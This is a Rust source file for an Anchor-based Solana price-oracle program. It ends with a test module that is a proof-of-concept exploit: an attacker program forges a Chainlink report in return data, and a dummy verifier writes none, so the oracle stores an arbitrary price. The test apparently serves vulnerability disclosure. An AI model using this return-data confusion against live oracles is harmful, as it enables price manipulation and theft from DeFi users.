#![allow(clippy::result_large_err)] //Needed because we can't change Anchor result type
pub mod errors;
pub mod oracles;
pub mod program_id;
pub mod states;
pub mod utils;

mod handlers;

// Local use
use std::convert::TryInto;

pub use anchor_lang;
use anchor_lang::prelude::*;
pub use handler_update_token_metadata::UpdateTokenMetadataMode;
use handlers::*;
pub use num_enum;
use program_id::PROGRAM_ID;
pub use whirlpool;
#[cfg(feature = "yvaults")]
pub use yvaults;

pub use crate::{errors::*, states::*, utils::scope_chain};

declare_id!(PROGRAM_ID);

// Note: Need to be directly integer value to not confuse the IDL generator
pub const MAX_ENTRIES_U16: u16 = 512;
// Note: Need to be directly integer value to not confuse the IDL generator
pub const MAX_ENTRIES: usize = 512;
pub const VALUE_BYTE_ARRAY_LEN: usize = 32;

#[program]
pub mod scope {

    use super::*;
    use anchor_lang::solana_program::program::set_return_data;

    pub fn initialize(ctx: Context<Initialize>, feed_name: String) -> Result<()> {
        handler_initialize::process(ctx, feed_name)
    }

    pub fn refresh_price_list<'info>(
        ctx: Context<'_, '_, '_, 'info, RefreshList<'info>>,
        tokens: Vec<u16>,
    ) -> Result<()> {
        handler_refresh_prices::refresh_price_list(ctx, &tokens)
    }

    pub fn refresh_chainlink_price<'info>(
        ctx: Context<'_, '_, '_, 'info, RefreshChainlinkPrice<'info>>,
        token: u16,
        serialized_chainlink_report: Vec<u8>,
    ) -> Result<()> {
        handler_refresh_chainlink_price::refresh_chainlink_price(
            ctx,
            token,
            serialized_chainlink_report,
        )
    }

    /// IMPORTANT: we assume the tokens passed in to this ix are in the same order in which
    /// they are found in the message payload. Thus, we rely on the client to do this work
    pub fn refresh_pyth_lazer_price<'info>(
        ctx: Context<'_, '_, '_, 'info, RefreshPythLazerPrice<'info>>,
        tokens: Vec<u16>,
        serialized_pyth_message: Vec<u8>,
        ed25519_instruction_index: u16,
    ) -> Result<()> {
        handler_refresh_pyth_lazer_price::refresh_pyth_lazer_price(
            ctx,
            &tokens,
            serialized_pyth_message,
            ed25519_instruction_index,
        )
    }

    #[allow(clippy::too_many_arguments)]
    pub fn update_mapping(
        ctx: Context<UpdateOracleMapping>,
        token: u16,
        price_type: u8,
        twap_enabled: bool,
        twap_source: u16,
        ref_price_index: u16,
        feed_name: String,
        generic_data: [u8; 20],
    ) -> Result<()> {
        let token: usize = token
            .try_into()
            .map_err(|_| ScopeError::OutOfRangeIntegralConversion)?;
        let _feed_name = feed_name;
        handler_update_mapping::process(
            ctx,
            token,
            price_type,
            twap_enabled,
            twap_source,
            ref_price_index,
            &generic_data,
        )
    }

    pub fn reset_twap(ctx: Context<ResetTwap>, token: u64, feed_name: String) -> Result<()> {
        let entry_id: usize = token
            .try_into()
            .map_err(|_| ScopeError::OutOfRangeIntegralConversion)?;
        handler_reset_twap::process(ctx, entry_id, feed_name)
    }

    pub fn update_token_metadata(
        ctx: Context<UpdateTokensMetadata>,
        index: u64,
        mode: u64,
        feed_name: String,
        value: Vec<u8>,
    ) -> Result<()> {
        msg!(
            "update_token_metadata index {} mode {} feed_name {}",
            index,
            mode,
            feed_name
        );
        let index: usize = index
            .try_into()
            .map_err(|_| ScopeError::OutOfRangeIntegralConversion)?;
        handler_update_token_metadata::process(ctx, index, mode, value, feed_name)
    }

    pub fn set_admin_cached(
        ctx: Context<SetAdminCached>,
        new_admin: Pubkey,
        feed_name: String,
    ) -> Result<()> {
        handler_set_admin_cached::process(ctx, new_admin, feed_name)
    }

    pub fn approve_admin_cached(ctx: Context<ApproveAdminCached>, feed_name: String) -> Result<()> {
        handler_approve_admin_cached::process(ctx, feed_name)
    }

    pub fn create_mint_map(
        ctx: Context<CreateMintMap>,
        seed_pk: Pubkey,
        seed_id: u64,
        bump: u8,
        scope_chains: Vec<[u16; 4]>,
    ) -> Result<()> {
        handler_create_mint_map::process(ctx, seed_pk, seed_id, bump, scope_chains)
    }

    pub fn close_mint_map(ctx: Context<CloseMintMap>) -> Result<()> {
        handler_close_mint_map::process(ctx)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use anchor_lang::prelude::*;
    use anchor_lang::solana_program::program::set_return_data;
    use anchor_lang::solana_program::pubkey::Pubkey;
    use anchor_lang::InstructionData;
    use chainlink_streams_report::{
        feed_id::ID as FeedID,
        report::v3::ReportDataV3,
    };
    use solana_logger;
    use solana_program_test::{processor, ProgramTest};
    use solana_sdk::{
        account::Account,
        signature::{Keypair, Signer},
        transaction::Transaction,
        instruction::{AccountMeta, Instruction},
        sysvar,
    };
    use std::str::FromStr;

    // Minimal attacker program: sets global return data to crafted bytes
    fn attacker_processor(
        _program_id: &Pubkey,
        _accounts: &[AccountInfo],
        ix_data: &[u8],
    ) -> ProgramResult {
        // ix_data is already the serialized forged report
        set_return_data(ix_data);
        Ok(())
    }

    // Minimal dummy verifier program: succeeds but writes no return data
    fn dummy_verifier_processor(
        _program_id: &Pubkey,
        _accounts: &[AccountInfo],
        _ix_data: &[u8],
    ) -> ProgramResult {
        // Intentionally do NOT set return data to simulate last-writer-not-verifier
        Ok(())
    }

    #[tokio::test]
    async fn poc_chainlink_return_data_confusion_sets_arbitrary_price() {
        solana_logger::setup();

        // Use localnet feature program id
        let scope_program_id = crate::id();
        let attacker_program_id = Pubkey::new_unique();
        let dummy_verifier_program_id = crate::oracles::chainlink::chainlink_streams_itf::VERIFIER_PROGRAM_ID;

        let mut pt = ProgramTest::new(
            "scope",
            scope_program_id,
            processor!(scope::entry),
        );

        // Register attacker and dummy verifier processors
        pt.add_program("attacker_prog", attacker_program_id, processor!(attacker_processor));
        pt.add_program("dummy_verifier", dummy_verifier_program_id, processor!(dummy_verifier_processor));

        // Allocate accounts for init
        use crate::utils::consts::{CONFIGURATION_SIZE, ORACLE_MAPPING_SIZE, ORACLE_PRICES_SIZE, ORACLE_TWAPS_SIZE, TOKEN_METADATA_SIZE};

        let admin = Keypair::new();
        let user = Keypair::new();

        let feed_name = String::from("TEST_FEED");
        let (cfg_pda, _cfg_bump) = crate::utils::pdas::config_pubkey(&feed_name);

        // configuration PDA will be derived and created by the program
        let token_metadatas = Keypair::new();
        let oracle_twaps = Keypair::new();
        let oracle_prices = Keypair::new();
        let oracle_mappings = Keypair::new();

        // Build bank with accounts pre-funded and allocated
        // Fund admin account to pay for PDA creation
        pt.add_account(
            admin.pubkey(),
            Account {
                lamports: 50_000_000_000,
                data: vec![],
                owner: anchor_lang::system_program::ID,
                executable: false,
                rent_epoch: 0,
            },
        );
        pt.add_account(
            token_metadatas.pubkey(),
            Account {
                lamports: 10_000_000_000,
                data: vec![0u8; 8 + TOKEN_METADATA_SIZE],
                owner: scope_program_id,
                executable: false,
                rent_epoch: 0,
            },
        );
        pt.add_account(
            oracle_twaps.pubkey(),
            Account {
                lamports: 10_000_000_000,
                data: vec![0u8; 8 + ORACLE_TWAPS_SIZE],
                owner: scope_program_id,
                executable: false,
                rent_epoch: 0,
            },
        );
        pt.add_account(
            oracle_prices.pubkey(),
            Account {
                lamports: 10_000_000_000,
                data: vec![0u8; 8 + ORACLE_PRICES_SIZE],
                owner: scope_program_id,
                executable: false,
                rent_epoch: 0,
            },
        );
        pt.add_account(
            oracle_mappings.pubkey(),
            Account {
                lamports: 10_000_000_000,
                data: vec![0u8; 8 + ORACLE_MAPPING_SIZE],
                owner: scope_program_id,
                executable: false,
                rent_epoch: 0,
            },
        );

        let mut ctx = pt.start_with_context().await;

        // Initialize accounts via program instruction
        let init_accounts = scope::accounts::Initialize {
            admin: admin.pubkey(),
            system_program: anchor_lang::system_program::ID,
            configuration: cfg_pda,
            token_metadatas: token_metadatas.pubkey(),
            oracle_twaps: oracle_twaps.pubkey(),
            oracle_prices: oracle_prices.pubkey(),
            oracle_mappings: oracle_mappings.pubkey(),
        };
        let init_ix = Instruction {
            program_id: scope_program_id,
            accounts: init_accounts.to_account_metas(None),
            data: scope::instruction::Initialize { feed_name: feed_name.clone() }.data(),
        };

        let mut tx = Transaction::new_with_payer(&[init_ix], Some(&admin.pubkey()));
        tx.sign(&[&admin], ctx.last_blockhash);
        ctx.banks_client.process_transaction(tx).await.unwrap();

        // Configure mapping for token 0 as Chainlink with generic confidence factor bytes
        let token_index: u16 = 0;
        let confidence_factor_u32: u32 = 10; // arbitrary tolerance factor
        let mut generic = [0u8; 20];
        generic[..4].copy_from_slice(&confidence_factor_u32.to_le_bytes());

        // pick a mapping feed_id equal to some account pubkey (we'll set it to oracle_mappings itself for simplicity)
        let feed_account = oracle_mappings.pubkey();

        let upd_accounts = scope::accounts::UpdateOracleMapping {
            admin: admin.pubkey(),
            configuration: cfg_pda,
            oracle_mappings: oracle_mappings.pubkey(),
            price_info: Some(feed_account),
        };

        let update_ix = Instruction {
            program_id: scope_program_id,
            accounts: upd_accounts.to_account_metas(None),
            data: scope::instruction::UpdateMapping {
                token: token_index,
                price_type: crate::oracles::OracleType::Chainlink as u8,
                twap_enabled: false,
                twap_source: 0,
                ref_price_index: u16::MAX,
                feed_name: feed_name.clone(),
                generic_data: generic,
            }
            .data(),
        };

        let mut tx = Transaction::new_with_payer(&[update_ix], Some(&admin.pubkey()));
        tx.sign(&[&admin], ctx.last_blockhash);
        ctx.banks_client.process_transaction(tx).await.unwrap();

        // Build a forged Chainlink v3 report that passes validation when bytes are attacker-controlled
        let observations_timestamp: u64 = (ctx.banks_client.get_sysvar::<solana_sdk::sysvar::clock::Clock>().await.unwrap().unix_timestamp + 1) as u64;
        let feed_id = FeedID(feed_account.to_bytes());
        let price_value = num_bigint::BigInt::from(1_000_000_000_000_000_000u128); // 1.0 with 18 decimals
        let bid = num_bigint::BigInt::from(999_000_000_000_000_000u128);
        let ask = num_bigint::BigInt::from(1_001_000_000_000_000_000u128);
        let fake_report = ReportDataV3 {
            feed_id,
            valid_from_timestamp: observations_timestamp as u32,
            observations_timestamp: observations_timestamp as u32,
            native_fee: num_bigint::BigInt::from(0u8),
            link_fee: num_bigint::BigInt::from(0u8),
            expires_at: (observations_timestamp as u32).saturating_add(100),
            benchmark_price: price_value.clone(),
            bid: bid.clone(),
            ask: ask.clone(),
        };
        let forged_bytes = fake_report.abi_encode().unwrap();

        // Attacker instruction writes forged bytes to return data
        let attacker_ix = Instruction {
            program_id: attacker_program_id,
            accounts: vec![],
            data: forged_bytes.clone(),
        };

        // Prepare refresh_chainlink_price ix using dummy verifier accounts
        let refresh_accounts = scope::accounts::RefreshChainlinkPrice {
            user: user.pubkey(),
            oracle_prices: oracle_prices.pubkey(),
            oracle_mappings: oracle_mappings.pubkey(),
            oracle_twaps: oracle_twaps.pubkey(),
            verifier_account: crate::oracles::chainlink::chainlink_streams_itf::VERIFIER_CONFIG_PUBKEY,
            access_controller: crate::oracles::chainlink::chainlink_streams_itf::ACCESS_CONTROLLER_PUBKEY,
            config_account: crate::oracles::chainlink::chainlink_streams_itf::get_config_pda(&forged_bytes),
            verifier_program_id: dummy_verifier_program_id,
        };
        let refresh_ix = Instruction {
            program_id: scope_program_id,
            accounts: refresh_accounts.to_account_metas(None),
            data: scope::instruction::RefreshChainlinkPrice { token: token_index, serialized_chainlink_report: forged_bytes.clone() }.data(),
        };

        // Compose transaction: attacker first, then refresh
        let mut tx = Transaction::new_with_payer(
            &[attacker_ix, refresh_ix],
            Some(&user.pubkey()),
        );
        tx.sign(&[&user], ctx.last_blockhash);
        let res = ctx.banks_client.process_transaction(tx).await;
        assert!(res.is_ok(), "transaction failed: {:?}", res);

        // Fetch oracle_prices and print resulting price
        let acct = ctx
            .banks_client
            .get_account(oracle_prices.pubkey())
            .await
            .unwrap()
            .expect("oracle_prices missing");
        // Skip 8 bytes anchor discriminator
        let mut data = &acct.data[8..];
        let oracle_prices_acc: crate::OraclePrices = anchor_lang::prelude::AccountDeserialize::try_deserialize_unchecked(&mut data).unwrap();
        let updated = oracle_prices_acc.prices[usize::from(token_index)];
        println!("PoC: updated price value = {:?}, exp = {:?}", updated.price.value, updated.price.exp);
        // Assert that price was updated to our forged value
        assert_eq!(updated.price.value, 1_000_000_000_000_000_000u64.min(u64::MAX));
    }
}
